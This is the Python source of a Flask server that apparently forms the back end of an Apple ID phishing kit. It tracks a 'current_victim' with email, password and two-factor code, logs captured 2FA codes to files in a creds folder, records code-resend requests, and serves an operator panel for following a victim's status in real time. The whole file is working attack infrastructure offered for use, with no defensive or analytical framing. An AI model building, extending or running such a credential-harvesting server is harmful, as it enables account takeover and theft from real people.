import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from pathlib import Path

app = Flask(__name__)
BASE_DIR = Path(__file__).parent.resolve()

STATE_FILE = BASE_DIR / 'victim_state.json'

# Track current victim with password
current_victim = {'status': 'idle', 'email': '', 'password': '', 'timestamp': '', '2fa_code': ''}
resend_requests = []

def get_state():
    return current_victim

def set_state(status, email='', password='', two_fa_code=''):
    global current_victim
    current_victim = {
        'status': status,
        'email': email,
        'password': password,
        '2fa_code': two_fa_code,
        'timestamp': datetime.now().isoformat()
    }
    with open(STATE_FILE, 'w') as f:
        json.dump(current_victim, f)
    return current_victim

@app.route('/api/resend-request', methods=['POST'])
def add_resend_request():
    data = request.json
    email = data.get('appleid', '')
    resend_requests.append({
        'email': email,
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({'status': 'success'})

@app.route('/api/get-resend-requests')
def get_resend_requests():
    return jsonify(resend_requests[-20:])

@app.route('/api/check-state')
def check_state():
    return jsonify(get_state())

@app.route('/api/set-state', methods=['POST'])
def set_victim_state():
    data = request.json
    status = data.get('status', 'idle')
    email = data.get('email', '')
    password = data.get('password', '')
    two_fa_code = data.get('2fa_code', '') or data.get('two_fa_code', '')
    state = set_state(status, email, password, two_fa_code)
    return jsonify({'status': 'success', 'state': state})

@app.route('/api/set-2fa', methods=['POST'])
def set_2fa():
    data = request.json
    code = data.get('code', '')
    email = data.get('email', '')
    
    # Save 2FA code
    log_file = BASE_DIR / '2fa_log.txt'
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(log_file, 'a') as f:
        f.write(f"[{ts}] 2FA Code: {code} for {email}\n")
    
    # Also save to file
    creds_dir = BASE_DIR / 'creds'
    if not creds_dir.exists():
        creds_dir.mkdir(parents=True, exist_ok=True)
    
    filename = creds_dir / f"2fa_{ts.replace(':', '-').replace(' ', '_')}.txt"
    with open(filename, 'w') as f:
        f.write(f"2FA Code: {code}\nApple ID: {email}\nTimestamp: {ts}\n")
    
    return jsonify({'status': 'success'})

@app.route('/api/clear-state', methods=['POST'])
def clear_state():
    set_state('idle', '', '')
    return jsonify({'status': 'cleared'})

@app.route('/api/get-state')
def get_victim_state():
    return jsonify(get_state())

@app.route('/panel')
def panel():
    return send_from_directory(BASE_DIR, 'panel.html')

if __name__ == '__main__':
    print("State server running on port 5002")
    app.run(host='0.0.0.0', port=5002, debug=True)